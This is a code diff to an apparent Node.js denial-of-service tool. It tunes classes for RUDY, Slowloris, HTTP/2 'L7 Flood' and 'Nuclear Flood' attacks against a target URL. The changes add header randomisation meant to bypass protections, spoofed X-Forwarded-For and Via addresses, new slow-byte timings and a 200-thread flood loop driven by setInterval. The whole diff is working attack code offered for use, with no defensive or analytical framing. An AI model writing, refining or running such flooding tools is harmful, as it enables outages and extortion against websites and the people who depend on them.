@@ -26,7 +26,8 @@ const userAgents = [
 const referers = [
     "https://www.google.com/", "https://www.youtube.com/", "https://www.facebook.com/", "https://www.twitter.com/",
     "https://www.instagram.com/", "https://www.baidu.com/", "https://www.wikipedia.org/", "https://yandex.ru/",
-    "https://yahoo.com/", "https://www.amazon.com/", "https://www.reddit.com/", "https://duckduckgo.com/", "https://www.bing.com/",
+    "https://yahoo.com/", "https://www.amazon.com/", "https://www.reddit.com/", "https://duckduckgo.com/", "https://www.bing.com/", "https://www.tiktok.com/",
+    "https://www.linkedin.com/", "https://www.pinterest.com/", "https://www.tumblr.com/",
 ];
 
 const acceptHeaders = [
@@ -34,6 +35,8 @@ const acceptHeaders = [
     "application/json, text/plain, */*", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*",
     "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5", "*/*",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "application/json, text/javascript, */*; q=0.01",
 ];
 
 function getRandomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
@@ -84,6 +87,7 @@ class BypassGenerator {
     generateHeaders() {
         const profile = getRandomElement(this.browserProfiles);
         const randomIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+        const referer = getRandomElement(referers);
 
         const headers = {
             'accept': getRandomElement(acceptHeaders),
@@ -91,13 +95,17 @@ class BypassGenerator {
             'accept-language': getRandomElement(this.acceptLanguages),
             'cache-control': 'no-cache',
             'pragma': 'no-cache',
-            'referer': getRandomElement(referers),
+            'dnt': '1', // Do Not Track
+            'sec-gpc': '1', // Global Privacy Control
+            'referer': referer,
+            'origin': new URL(referer).origin,
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
+            'sec-fetch-user': `?${Math.round(Math.random())}`,
             'upgrade-insecure-requests': '1',
             'user-agent': profile.ua,
+            'te': 'trailers',
             'X-Forwarded-For': randomIp,
             'Via': `1.1 ${randomIp}`
         };
@@ -115,13 +123,13 @@ class BypassGenerator {
         const payloadType = getRandomElement(['json', 'form']);
         if (payloadType === 'json') {
             const jsonBody = {};
-            for (let i = 0; i < 5; i++) {
+            for (let i = 0; i < 7; i++) {
                 jsonBody[generateRandomString(8)] = generateRandomString(12);
             }
             return { contentType: 'application/json', body: JSON.stringify(jsonBody) };
         } else {
             let formBody = '';
-            for (let i = 0; i < 5; i++) {
+            for (let i = 0; i < 7; i++) {
                 formBody += `${generateRandomString(8)}=${generateRandomString(12)}&`;
             }
             return { contentType: 'application/x-www-form-urlencoded', body: formBody.slice(0, -1) };
@@ -182,7 +190,7 @@ class RudyAttack {
         };
 
         const scheduleNextByte = () => {
-            const randomInterval = 6000 + Math.random() * 2000; // Even more aggressive keep-alive
+            const randomInterval = 8000 + Math.random() * 4000;
             timeoutId = setTimeout(() => {
                 sendSlowByte();
                 scheduleNextByte();
@@ -267,7 +275,7 @@ class SlowlorisAttack {
                 this.stats.failed++;
                 clearInterval(intervalId);
             }
-        }, 7000 + Math.random() * 3000); // Even more aggressive keep-alive
+        }, 10000 + Math.random() * 5000); // Send a header every 10-15 seconds
 
         return { req, intervalId };
     }
@@ -294,6 +302,7 @@ class L7Flood {
         this.threadCount = threadCount;
         this.delay = delay;
         this.stats = stats;
+        this._running = false;
         this.bypasser = bypasser;
         try {
             this.url = new URL(targetUrl);
@@ -314,7 +323,7 @@ class L7Flood {
             method: method,
             headers: headers,
             http2: true,
-            timeout: { request: 3000 }, // More Aggressive timeout
+            timeout: { request: 4000 }, // Adaptive timeout to reduce failures under load
             retry: { limit: 0 },
             throwHttpErrors: false,
         };
@@ -333,22 +342,18 @@ class L7Flood {
         }
     }
 
-    async runWorker() {
-        while (this.running) {
-            await this.sendRequest();
-        }
-    }
-
     start() {
-        this.running = true;
-        for (let i = 0; i < this.threadCount; i++) {
-            // Fire-and-forget. The internal loop in runWorker will keep it running.
-            this.runWorker();
-        }
+        this.floodInterval = setInterval(() => {
+            for (let i = 0; i < this.threadCount; i++) {
+                this.sendRequest(); // Fire and forget
+            }
+        }, this.delay);
     }
 
     stop() {
-        this.running = false;
+        if (this.floodInterval) {
+            clearInterval(this.floodInterval);
+        }
     }
 }
 
@@ -370,7 +375,7 @@ class NuclearFlood extends L7Flood {
             headers: headers,
             body: requestBody,
             http2: true,
-            timeout: { request: 3000 }, // More Aggressive timeout
+            timeout: { request: 4000 }, // Adaptive timeout to reduce failures under load
             retry: { limit: 0 },
             throwHttpErrors: false,
         };
@@ -385,7 +390,7 @@ class NuclearFlood extends L7Flood {
 }
 
 process.on('message', ({ targetUrl, duration }) => {
-    const threads = 300;
+    const threads = 200;
     const l7Delay = 100;
     const allAttackModes = ['RUDY', 'L7 Flood', 'Slowloris', 'Nuclear Flood'];
 
@@ -396,7 +401,6 @@ process.on('message', ({ targetUrl, duration }) => {
     }
 
     const bypasser = new BypassGenerator();
-    const stats = { total: 0, success: 0, failed: 0, phase: 'Initializing...' };
 
     // Kirim statistik ke proses induk setiap detik
     setInterval(() => {
@@ -412,6 +416,7 @@ process.on('message', ({ targetUrl, duration }) => {
         }
     }, 1000);
 
+    const stats = { total: 0, success: 0, failed: 0, phase: 'Initializing...' };
     const totalDurationMs = duration * 1000;
     const phaseDurationMs = totalDurationMs / allAttackModes.length;
     let currentAttacker = null;
